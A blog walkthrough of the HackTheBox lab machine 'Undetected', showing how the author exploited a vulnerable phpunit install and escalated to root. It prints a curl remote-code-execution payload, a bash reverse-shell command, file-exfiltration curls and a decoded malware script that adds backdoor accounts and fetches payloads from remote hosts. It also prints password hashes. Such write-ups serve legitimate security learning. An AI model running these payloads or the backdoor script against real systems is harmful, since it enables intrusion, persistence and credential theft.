---
title: "Walk-through of Undetected from HackTheBox"
header:
  teaser: /assets/images/2022-02-20-17-20-02.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - CVE-2017-9041
  - JohnTheRipper
  - Ghidra
  - CyberChef
---

## Machine Information

![undetected](/assets/images/2022-02-20-17-20-02.png)

[Undetected](https://app.hackthebox.com/machines/439) is a medium rated Linux machine on HackTHeBox and was created by [TheCyberGeek](https://app.hackthebox.com/users/114053). We start by finding a website with a vulnerable version of phpunit. We exploit this to perform remote command execution and gain a reverse shell. A file is found on the server containing a Hex encoded hash which is cracked to give us a user password. From there we find a hidden shared library file, which we reverse using Ghidra to find a base64 encoded string. This leads us to a modified version of sshd, which when reversed using Ghidra reveals a backdoor has been added. After decoding we finally have the root password and complete the box.

<!--more-->

Skills required are basic web and OS enumeration, as well researching exploits. Skills learned are using Ghidra to reverse engineer files and search for vulnerabilities.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Undetected](https://www.hackthebox.com/home/machines/profile/439) |
| Machine Release Date | 19th February 2022 |
| Date I Completed It | 22nd February 2022 |
| Distribution Used | Kali 2021.4 – [Release Info](https://www.kali.org/blog/kali-linux-2021-4-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/htb]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.146 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb]
└─# nmap -p$ports -sC -sV -oA undetected 10.10.11.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 17:22 GMT
Nmap scan report for 10.10.11.146
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dianas Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

## Website

From the response we see Diana's Jewelry is on port 80:

![undetected-website](/assets/images/2022-02-20-17-24-47.png)

Nothing much on the site but the store button reveals a subdomain, let's add to our hosts file:

```sh
┌──(root💀kali)-[~/htb]
└─# echo "10.10.11.146 djewelry.htb store.djewelry.htb" >> /etc/hosts
```

Visiting the store doesn't reveal anything obvious:

![undetected-store](/assets/images/2022-02-20-17-29-57.png)

## Gobuster

Next look for folders with gobuster:

```sh
┌──(root💀kali)-[~/htb]
└─# gobuster dir -u http://store.djewelry.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/20 17:32:54 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]
/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]   
/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/] 
/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
/server-status        (Status: 403) [Size: 283]                                        
===============================================================
2022/02/20 17:34:13 Finished
===============================================================
```

## CVE-2017-9041

The vendor folder is suspicious. Why would that be accessible on a web server? Browsing it we see a number of subfolders, and searching for "exploit vendor folder" found [this](https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/) which explains how it could be vulnerable to CVE-2017-9841. Further information [here](https://nvd.nist.gov/vuln/detail/CVE-2017-9841) and [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841) gives us a way to try and exploit it.

First I found [this](https://github.com/RandomRobbieBF/phpunit-brute) brute force script which I used to confirm the phpunit version here is vulnerable:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# wget https://raw.githubusercontent.com/RandomRobbieBF/phpunit-brute/master/phpunit-brute.py
--2022-02-20 17:41:45--  https://raw.githubusercontent.com/RandomRobbieBF/phpunit-brute/master/phpunit-brute.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2685 (2.6K) [text/plain]
Saving to: ‘phpunit-brute.py’
phpunit-brute.py        100%[==================================================>]   2.62K  --.-KB/s    in 0s      
2022-02-20 17:41:45 (40.7 MB/s) - ‘phpunit-brute.py’ saved [2685/2685]

┌──(root💀kali)-[~/htb/undetected]
└─# python3 phpunit-brute.py -u http://store.djewelry.htb               
[-] No Luck for /_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/Laravel E2N test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
<SNIP>
[-] No Luck for /v2/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [-]
[-] No Luck for /vendor/nesbot/carbon/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /vendor/phpunit/phpunit/LICENSE/eval-stdin.php [-]
[+] Found RCE for http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [+]
```

The script confirms this is our path forward with phpunit being exploitable. Examples [here](https://gist.github.com/AssassinUKG/9f150ee3da9d9a9e421635876859a26d) and [here](http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/) showed me how to try it:

```sh
curl --data "<?php echo(pi());" http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

Which worked when I tested the box:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php echo(pi());" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
3.1415926535898
```

After some enumeration I tried a reverse shell:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.14/1337 0>&1\"');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

## Reverse Shell

This worked and my waiting nc listener caught the shell:

```sh
┌──(root💀kali)-[~]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.146] 57118
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ 
```

I'm in as www-data:

```text
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Info file

After some enumeration around the file system I found something interesting owned by www-data:

```text
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ find / -user www-data -not -path "/proc/*" -not -path "/var/www/*" 2> /dev/null
<path "/proc/*" -not -path "/var/www/*" 2> /dev/null
/tmp/tmux-33
/dev/pts/0
/var/cache/apache2/mod_cache_disk
/var/backups/info
/run/lock/apache2
```

What is this info file in the backups folder? Let's have a look:

```text
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cp /var/backups/info /tmp
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /tmp

www-data@production:/tmp$ file info
file info
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped

www-data@production:/tmp$ ./info
[-] substring 'ffff' not found in dmesg
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
```

Not sure what it does, pull it over to Kali so we can look a bit further:

```text
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php system('cat /var/backups/info');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output info
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27334    0 27296  100    38   270k    385 --:--:-- --:--:-- --:--:--  272k
```

## Look At File Using Strings

First thing to try on binaries is strings to see whats inside in plaintext:

```text
┌──(root💀kali)-[~/htb/undetected]
└─# strings info
/lib64/ld-linux-x86-64.so.2
<SNIP>
[-] setsockopt(PACKET_VERSION)
[-] setsockopt(PACKET_RX_RING)
[-] socket(AF_PACKET)
[-] bind(AF_PACKET)
[-] sendto(SOCK_RAW)
[-] socket(SOCK_RAW)
[-] socket(SOCK_DGRAM)
[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)
[-] klogctl(SYSLOG_ACTION_READ_ALL)
Freeing SMP
[-] substring '%s' not found in dmesg
ffff
/bin/bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f2<SNIP>
3a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737<SNIP>
s342377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b<SNIP>
[-] fork()
/etc/shadow
[.] checking if we got root
[-] something went wrong =(
```

## Decode With XXD

It's a lengthy output to look through but there's an obvious hex string which I decoded using xxd:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# echo 776765742074656d<SNIP>572732e7478743b | xxd -r -p | sed 's/;/\n/g'
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys
wget tempfiles.xyz/.main -O /var/lib/.main
chmod 755 /var/lib/.main
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd
while read -r user group home shell _
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd
done < users.txt
rm users.txt
```

## Crack With JohnTheRipper

We see this is a script which looks to be copying files, setting a cronjob, adding a user and password, then tidying up. We can take the hash of the password from this line and crack it with JohnTheRipper:

```sh
echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow
```

We need the passwd file to see which user the hash is for:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php system('cat /etc/passwd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
```

We have two steven accounts, looking at the echo above it's adding a 1 so we know the account we're cracking is steven1. Put that line in a file:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# echo "steven1:x:1000:1000:,,,:/home/steven:/bin/bash" > steven1.passwd
  ```

Now put the hash of the password in a file:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# echo "steven1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::" > steven1.shadow
```

Now use unshadow to create our file for John:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# unshadow steven1.passwd steven1.shadow > steven1.hash
```

Then set John going with rockyou:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt steven1.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (steven1)
1g 0:00:01:44 DONE (2022-02-20 22:47) 0.009611g/s 856.2p/s 856.2c/s 856.2C/s littlebrat..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## User Flag

We quickly get the password and can switch user to steven1:

```text
www-data@production:/tmp$ su steven1
Password: ihatehackers
id
uid=1000(steven) gid=1000(steven) groups=1000(steven)
```

Let's get the user flag:

```text
steven@production:/root$ cat /home/steven/user.txt 
2c2027e7412139c4cb59d97c6411ba99
```

When looking around the first thing I noticed was Steven has an email:

```text
cat /var/mail/steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

## Suspicious Apache Module

There's a clue here about a misbehaving Apache service. Looking in the modules folder I notice this which looks odd:

```text
steven@production:/$ ls -lsa /usr/lib/apache2/modules/mod_r*
16 -rw-r--r-- 1 root root 14544 Jan  5 14:49 /usr/lib/apache2/modules/mod_ratelimit.so
36 -rw-r--r-- 1 root root 34800 May 17  2021 /usr/lib/apache2/modules/mod_reader.so
16 -rw-r--r-- 1 root root 14544 Jan  5 14:49 /usr/lib/apache2/modules/mod_reflector.so
32 -rw-r--r-- 1 root root 30928 Jan  5 14:49 /usr/lib/apache2/modules/mod_remoteip.so
20 -rw-r--r-- 1 root root 18640 Jan  5 14:49 /usr/lib/apache2/modules/mod_reqtimeout.so
16 -rw-r--r-- 1 root root 14544 Jan  5 14:49 /usr/lib/apache2/modules/mod_request.so
76 -rw-r--r-- 1 root root 75984 Jan  5 14:49 /usr/lib/apache2/modules/mod_rewrite.so
```

A mod file with a different timestamp to the others. Checking the [Debian packages filelist](https://packages.debian.org/sid/amd64/apache2-bin/filelist) I can see that file isn't part of the standard distribution:

```text
/usr/lib/apache2/modules/mod_ratelimit.so
/usr/lib/apache2/modules/mod_reflector.so
/usr/lib/apache2/modules/mod_remoteip.so
/usr/lib/apache2/modules/mod_reqtimeout.so
/usr/lib/apache2/modules/mod_request.so
/usr/lib/apache2/modules/mod_rewrite.so
```

So mod_reader.so is worth looking at, let's pull it over to Kali:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php system('cat /usr/lib/apache2/modules/mod_reader.so');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output mod_reader.so
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 34859    0 34800  100    59   176k    307 --:--:-- --:--:-- --:--:--  177k
```

## Reversing With Ghidra

Time to fire up Ghidra and poke around inside the file. [Here](https://www.kalilinux.in/2021/06/ghidra-reverse-engineering-kali-linux.html) is a useful post if you aren't sure how to use Ghidra.

I haven't got it installed on this VM, but before adding note this needs around 800mb of space to install:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# apt install ghidra        
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  ghidra-data openjdk-11-jdk-headless openjdk-11-jre openjdk-11-jre-headless
The following NEW packages will be installed:
  ghidra ghidra-data openjdk-11-jdk-headless
The following packages will be upgraded:
  openjdk-11-jre openjdk-11-jre-headless
2 upgraded, 3 newly installed, 0 to remove and 587 not upgraded.
Need to get 613 MB of archives.
After this operation, 1,282 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre amd64 11.0.14+9-1 [175 kB]
Get:2 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre-headless amd64 11.0.14+9-1 [37.3 MB]
Get:3 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jdk-headless amd64 11.0.14+9-1 [214 MB]
Get:4 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra amd64 10.1.2-0kali2 [282 MB]
Get:5 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra-data all 9.2-0kali2 [79.1 MB]
Fetched 613 MB in 15min 39s (653 kB/s)
(Reading database ... 300882 files and directories currently installed.)
Preparing to unpack .../openjdk-11-jre_11.0.14+9-1_amd64.deb ...
<SNIP>
Setting up ghidra-data (9.2-0kali2) ...
Setting up ghidra (10.1.2-0kali2) ...
Processing triggers for kali-menu (2021.4.2) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for hicolor-icon-theme (0.17-2) ...
Processing triggers for mailcap (3.70+nmu1) ...
```

With that installed simply type ghidra in the console to start up the GUI. Create a new project and import the mod_reader.so file:

![undetected-ghidra-mod_reader.so](/assets/images/2022-02-23-17-06-07.png)

Looking around I found a function called hook_post_config which contained some base64:

![undetected-ghidra](/assets/images/2022-02-21-23-01-59.png)

## Base64 Decode

Copying that out and decoding we find something interesting:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d

wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `datbase64: invalid input
```

It seems to be writing a picture out as the sshd daemon in sbin. Why would that be happening?

## Suspicious sshd File

Let's grab that sshd file and have a look at it on Kali:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# curl --data "<?php system('cat /usr/sbin/sshd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output sshd

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3559k    0 3559k  100    35  2749k     27  0:00:01  0:00:01 --:--:-- 2748k
```

Executing the file shows us it looks to be a normal sshd binary:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# ./sshd --help
unknown option -- -
OpenSSH_8.2p1, OpenSSL 1.1.1m  14 Dec 2021
usage: sshd [-46DdeiqTt] [-C connection_spec] [-c host_cert_file]
            [-E log_file] [-f config_file] [-g login_grace_time]
            [-h host_key_file] [-o option] [-p port] [-u len]
```

Version 8.2 was released on 14th Feb 2020, but I didn't find any easy vulnerabilities to try and exploit.

## Reversing With Ghidra Again

After importing this binary in to Ghidra and have a look I found something interesting:

![undetected-ghidra-sshd](/assets/images/2022-02-23-21-03-37.png)

The auth_password function has a variable called backdoor. Checking the official source code for that function [here](https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c) we can see it's been changed.

I won't go in to the details of how to work out what that added backdoor code does. The main bits to focus on are the variables being assigned values at the start:

```c#
char backdoor [31];
backdoor[30] = -0x5b;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._0_4_ = 0xf0e7abd6;
bVar7 = 0xd6;
pbVar4 = (byte *)backdoor;
```

The variable backdoor is created with 31 bytes. Then hex values in little endian format are stored in it. I've rearranged the order so it's descending, also note backdoor[30] is an invalid value of -0x5b, if you right click it in Ghidra you'll see the correct value is 0xa5.

Next there is a loop that iterates through pbVar4 which contains the result of all those hex values that were added to backdoor:

```c#
while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
}

iVar2 = strcmp(password,backdoor);
```

On each pass through the loop the values are xor'd with a key length of 96, and then later there is a sting compare to see if the password you entered when logging in to SSH matches the value of backdoor. It's quite hard to follow as there is intentional obfuscation by moving values around variables to confuse us. [This](https://en.cppreference.com/w/c/language/operator_precedence) is a good reference for C operators.

## Decoding Root Password

To see what the password is that's held by the backdoor variable we need to decode the above. It could be done with a simple Python loop, but even easier is using CyberChef:

![undetected-cyberchef](/assets/images/2022-02-23-22-07-15.png)

So just like in the function we've taken the contents of backdoor, converted from Little Endian to Hex and then XOR'd it. The result is the root password, so let's log on and finish the box:

```sh
┌──(root💀kali)-[~/htb/undetected]
└─# ssh root@djewelry.htb
root@djewelry.htbs password: 
Last login: Tue Feb 22 19:43:08 2022 from 10.10.14.193
root@production:~#
root@production:~# cat /root/root.txt
3a931f64fcdcfb18217aeb6bd37ad8d9

root@production:~# cat /etc/shadow
root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc./cDsb2nNZT0dYIbv.:19031:0:99999:7:::
```

All done. See you next time.
